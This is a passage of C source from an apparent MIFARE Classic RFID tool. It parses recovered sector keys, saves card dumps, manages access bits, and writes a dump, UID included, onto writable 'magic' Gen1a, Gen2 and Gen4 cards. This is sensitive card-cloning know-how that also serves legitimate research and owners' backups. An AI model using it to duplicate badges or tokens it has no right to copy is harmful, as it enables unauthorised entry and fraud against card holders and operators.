				if (v < 0) break;
				d->sig[i / 2] = (i & 1) ? (d->sig[i / 2] | v) : v << 4;
				if (i == 63) d->sigUidLen = s;
			}
			continue;
		}
		char kA[16], kB[16];
		if (sscanf(line, "%d A %15s B %15s", &s, kA, kB) != 3 || s < 0 || s >= d->sectors) continue;
		const char *ks[2] = { kA, kB };
		for (int k = 0; k < 2; k++) {
			d->keyFound[s][k] = strlen(ks[k]) == 12;
			for (int i = 0; i < 12 && d->keyFound[s][k]; i++) {
				int v = hexNibble(ks[k][i]);
				if (v < 0) d->keyFound[s][k] = false;
				else d->keys[s][k][i / 2] = (i & 1) ? (d->keys[s][k][i / 2] | v) : v << 4;
			}
		}
	}
	fclose(f);
	return true;
}

bool mfSaveDump(const MfDump *d, char *path, u32 pathMax)
{
	char uid[21] = "";
	for (int i = 0; i < card.uidLen; i++) sprintf(uid + 2 * i, "%02X", card.uid[i]);
	mkdir(MF_DIR, 0777);
	mkdir(MF_DUMPS, 0777);
	// Never overwrite an older dump (it may hold edits): UID.bin, UID-2.bin, ...
	struct stat st;
	snprintf(path, pathMax, MF_DUMPS "/%s.bin", uid);
	for (int i = 2; !stat(path, &st) && i < 1000; i++) snprintf(path, pathMax, MF_DUMPS "/%s-%d.bin", uid, i);
	return mfWriteDump(d, path);
}

// Access bits are stored twice (inverted); a broken copy locks a real sector for good.
bool mfAclValid(const u8 *t)
{
	return (t[7] >> 4) == (~t[6] & 0xF) && (t[8] & 0xF) == (~t[6] >> 4 & 0xF) && (t[8] >> 4) == (~t[7] & 0xF);
}

int mfAclGet(const u8 *t, int g)
{
	return (t[7] >> (4 + g) & 1) << 2 | (t[8] >> g & 1) << 1 | (t[8] >> (4 + g) & 1);
}

void mfAclSet(u8 *t, int g, int c)
{
	int c1 = c >> 2 & 1, c2 = c >> 1 & 1, c3 = c & 1;
	t[7] = (t[7] & ~(0x10 << g)) | c1 << (4 + g);
	t[8] = (t[8] & ~(0x01 << g)) | c2 << g;
	t[8] = (t[8] & ~(0x10 << g)) | c3 << (4 + g);
	t[6] = (t[6] & ~(0x01 << g)) | !c1 << g;
	t[6] = (t[6] & ~(0x10 << g)) | !c2 << (4 + g);
	t[7] = (t[7] & ~(0x01 << g)) | !c3 << g;
}

// The trailer's own C1 C2 C3: 001 and 011 leave keys and access bits writable (key A / key B).
bool mfTrailerRewritable(const u8 *t)
{
	int c = mfAclGet(t, 3);
	return c == 1 || c == 3;
}

enum { CLONE_GEN4, CLONE_GEN1A, CLONE_GEN2 };

// Gen2 trailer: write with the current key, then the new key A has to auth (keys read back as zeros).
static int gen2Trailer(const MfDump *tgt, int sec, u8 t, const u8 data[16])
{
	for (int kb = 0; kb < 2; kb++) {
		if (!tgt->keyFound[sec][kb]) continue;
		int r = 2;
		for (int i = 0; i < 16 && r == 2; i++) {
			Crypto1 c;
			if ((r = mfAuth(t, tgt->keys[sec][kb], kb, &c)) <= 0) break;
			r = mfWriteBlock(&c, t, data);
		}
		if (r < 0) return -1;
		if (r != 1) continue;
		Crypto1 c;
		for (int i = 0; i < 3; i++)
			if ((r = mfAuth(t, data, false, &c)) != 0) return r < 0 ? -1 : 1;
		FAIL(0, "sector %d: new key A does not auth", sec);
	}
	FAIL(0, "sector %d: trailer write refused", sec);
}

static int cloneBlock(int type, const MfDump *tgt, int sec, u8 b, const u8 data[16])
{
	if (type == CLONE_GEN4) return mfGen4Write(mfGen4Pwd, b, data);
	if (type == CLONE_GEN1A) return mfGen1aWrite(b, data);
	for (int kb = 0; kb < 2; kb++) {
		if (!tgt->keyFound[sec][kb]) continue;
		int r = mfWrite(b, tgt->keys[sec][kb], kb, data);
		if (r) return r;
	}
	FAIL(0, "block %d: write refused", b);
}

int mfCloneToMagic(const u8 (*data)[16], const bool *valid, int nblocks, bool force)
{
	int sectors = 0;
	while (sectors < 40 && mfFirstBlock(sectors) < nblocks) sectors++;
	if (mfFirstBlock(sectors) != nblocks) FAIL(0, "%d blocks: not whole sectors", nblocks);
	if (iso14aSelect() == -2) return -1; // current SAK
	MfMagic m;
	if (mfMagicDetect(mfGen4Pwd, false, &m) < 0) return -1;
	if ((m.flags & MF_MAGIC_GEN4) && m.cfgLen == MF_GEN4_CFG && m.cfg[0]) {
		// A GTU in Ultralight mode: back to Classic, sized for the dump (4-byte UID), then reactivated.
		u8 cfg[MF_GEN4_CFG];
		memcpy(cfg, m.cfg, MF_GEN4_CFG);
		cfg[0] = cfg[1] = cfg[27] = 0;
		cfg[24] = sectors == 40 ? 0x02 : 0x04;
		cfg[25] = 0;
		cfg[26] = sectors == 5 ? 0x09 : sectors == 32 ? 0x19 : sectors == 40 ? 0x18 : 0x08;
		logp("gen4 GTU in Ultralight mode: switching to Classic\n");
		int r = mfGen4SetConfig(mfGen4Pwd, cfg);
		if (r <= 0) return r;
		if (!iso14aStart()) FAIL(-1, "reactivate after the mode switch");
	}
	if (sectors > mfSectorsFromSak(card.sak)) FAIL(0, "dump has %d sectors, the card %d", sectors, mfSectorsFromSak(card.sak));
	for (int sec = 0; sec < sectors; sec++) {
		int t = mfFirstBlock(sec) + mfSectorBlocks(sec) - 1;
		if (valid[t] && !mfAclValid(data[t])) FAIL(0, "sector %d: broken access bits", sec);
	}

	if (mfMagicDetect(mfGen4Pwd, false, &m) < 0) return -1;
	int type = m.flags & MF_MAGIC_GEN4 ? CLONE_GEN4 : m.flags & MF_MAGIC_GEN1A ? CLONE_GEN1A : CLONE_GEN2;
	// The GTU computes its BCC; the others send block 0's as it is, and a wrong one breaks anticollision.
	if (type != CLONE_GEN4 && valid[0] && card.uidLen == 4
	    && (data[0][0] ^ data[0][1] ^ data[0][2] ^ data[0][3]) != data[0][4])
		FAIL(0, "block 0: bad BCC");
	static MfDump tgt;
	if (type == CLONE_GEN2) {
		int r = gen2AtsTest();
		if (!r) r = gen2AckTest();
		if (r < 0) return -1;
		if (!r) FAIL(0, "not a magic card");
		for (int sec = 0; sec < sectors && !force; sec++) {
			int t = mfFirstBlock(sec) + mfSectorBlocks(sec) - 1;
			if (valid[t] && !mfTrailerRewritable(data[t]))
				FAIL(0, "sector %d: trailer freezes it on Gen2 (force)", sec);
		}
		// Normal writes need the target's current keys: the dump's own trailer keys first.
		static u8 keys[MF_MAX_KEYS][6], extra[80][6];
		int nextra = 0;
		for (int sec = 0; sec < sectors; sec++) {
			int t = mfFirstBlock(sec) + mfSectorBlocks(sec) - 1;
			if (!valid[t]) continue;
			memcpy(extra[nextra++], data[t], 6);
			memcpy(extra[nextra++], data[t] + 10, 6);
		}
		int nkeys = mfKeyList(keys, MF_MAX_KEYS, (const u8 (*)[6])extra, nextra);
		if (mfDumpCard(&tgt, sectors, (const u8 (*)[6])keys, nkeys) < 0) return -1;
	}
	logp("clone %d sectors onto %s\n", sectors, type == CLONE_GEN4 ? "gen4 GTU" : type == CLONE_GEN1A ? "gen1a" : "gen2");

	// Sector 0 last: block 0 changes the UID (later SELECTs use the new one), its trailer after it.
	for (int i = 1; i <= sectors; i++) {
		int sec = i % sectors, b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec), t = b0 + nb - 1, r;
		if (mfCancel) FAIL(0, "cancelled before sector %d", sec);
		progOp("Writing sector %d", sec);
		progStep(i - 1, sectors);
		if (type == CLONE_GEN2 && !tgt.keyFound[sec][0] && !tgt.keyFound[sec][1]) FAIL(0, "sector %d: no key", sec);
		for (int b = b0 + (sec == 0); b < t; b++)
			if (valid[b] && (r = cloneBlock(type, &tgt, sec, b, data[b])) != 1) return r;
		if (sec == 0 && valid[0]) {
			if ((r = cloneBlock(type, &tgt, 0, 0, data[0])) != 1) return r;
			memcpy(card.uid, data[0], card.uidLen);
		}
		if (valid[t]) {
			r = type == CLONE_GEN2 ? gen2Trailer(&tgt, sec, t, data[t]) : cloneBlock(type, &tgt, sec, t, data[t]);
			if (r != 1) return r;
		}
		logp("  sector %2d done\n", sec);
	}
	return 1;
}
